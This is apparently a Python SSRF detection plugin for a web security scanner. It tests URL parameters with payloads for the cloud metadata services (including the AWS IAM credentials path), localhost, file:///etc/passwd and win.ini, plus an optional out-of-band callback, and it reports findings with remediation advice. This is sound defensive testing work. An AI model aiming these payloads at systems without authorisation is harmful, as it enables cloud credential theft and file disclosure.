"""SSRF: internal endpoints, cloud metadata, file:// and OOB callback probes."""

from __future__ import annotations

from argos.engine.findings import Finding, Severity, truncate
from argos.engine.probe import DEFAULT_POINTS, baseline, build_points, marker, send
from argos.engine.registry import Check, ScanContext, register

METADATA_PROBES = [
    ("http://169.254.169.254/latest/meta-data/", ("instance-id", "ami-", "hostname")),
    (
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ("role-name", "AccessKeyId", "SecretAccessKey"),
    ),
    (
        "http://metadata.google.internal/computeMetadata/v1/",
        ("projects/", "instance/id", "service-accounts"),
    ),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ("vmId", "subscriptionId")),
    ("http://127.0.0.1:80/", ()),
    ("http://localhost/", ()),
    ("file:///etc/passwd", ("root:x:0:0", "root:*:0:0")),
    ("file:///c:/windows/win.ini", ("[fonts]", "for 16-bit app support")),
]

INTERNAL_SIGS = (
    "root:x:0:0",
    "instance-id",
    "ami-",
    "AccessKeyId",
    "computeMetadata",
    "metadata/instance",
)


@register
class SSRF(Check):
    name = "ssrf"
    mode = "active"
    min_profile = "quick"
    summary = "SSRF: cloud metadata, localhost, file:// + OOB callback payloads"

    async def run(self, ctx: ScanContext) -> list[Finding]:
        points = build_points(ctx, limit=DEFAULT_POINTS)
        findings: list[Finding] = []
        callback = ctx.config.callback
        callback_sent = False

        for point in points:
            base = await baseline(ctx, point)
            for payload, sigs in METADATA_PROBES:
                resp = await send(ctx, point, payload)
                body = resp.text
                markers = sigs or INTERNAL_SIGS
                # a signature only counts when it is *new content* the server
                # produced — never when it merely echoes our payload or was
                # already on the baseline page (kills reflection false positives)
                hit = next(
                    (
                        s
                        for s in markers
                        if s not in payload
                        and s in body
                        and s not in (base.text or "")
                    ),
                    None,
                )
                if hit is None:
                    continue
                is_cloud = "169.254" in payload or "metadata.google" in payload
                is_file = payload.startswith("file://")
                if is_cloud:
                    title = "SSRF → cloud metadata endpoint"
                    sev, score = Severity.CRITICAL, 9.1
                    why = (
                        "The server fetched the cloud instance-metadata service — on most "
                        "clouds this exposes temporary IAM credentials (full account "
                        "takeover)."
                    )
                elif is_file:
                    title = "SSRF → local file read (file://)"
                    sev, score = Severity.HIGH, 7.5
                    why = "The server read a local file through the URL parameter."
                else:
                    title = "SSRF → internal/localhost service"
                    sev, score = Severity.HIGH, 7.5
                    why = "The server fetched an internal address on the attacker's behalf."
                findings.append(
                    Finding(
                        plugin=self.name,
                        title=title,
                        severity=sev,
                        cvss=score,
                        cwe="CWE-918",
                        url=point.endpoint,
                        parameter=point.param,
                        description=(
                            f"Parameter '{point.param}' fetches attacker-controlled URLs. "
                            f"Payload {payload!r} produced internal content ({hit!r}). {why}"
                        ),
                        remediation=(
                            "Allowlist outbound destinations (scheme+host+port), block "
                            "link-local/metadata ranges (169.254.0.0/16, 127.0.0.0/8, "
                            "10/8, 172.16/12, 192.168/16), disable redirects, and never "
                            "return raw fetch results to the client."
                        ),
                        evidence_request=(
                            f"{point.method} {point.endpoint}\n{point.param}={payload}"
                        ),
                        evidence_response=truncate(
                            f"HTTP {resp.status_code}\n{body[:700]}", 900
                        ),
                    )
                )
                break

            # OOB callback payload (blind SSRF) — requires a listener you control
            if callback:
                cb_payload = f"{callback.rstrip('/')}/argos-oob-{marker('')}"
                resp = await send(ctx, point, cb_payload)
                if resp.status_code < 500:
                    callback_sent = True

        if callback_sent:
            ctx.warnings.append(
                f"SSRF check sent OOB payloads to {callback} — check your listener "
                "(argos listen / webhook.site) for hits to confirm blind SSRF."
            )
        return findings
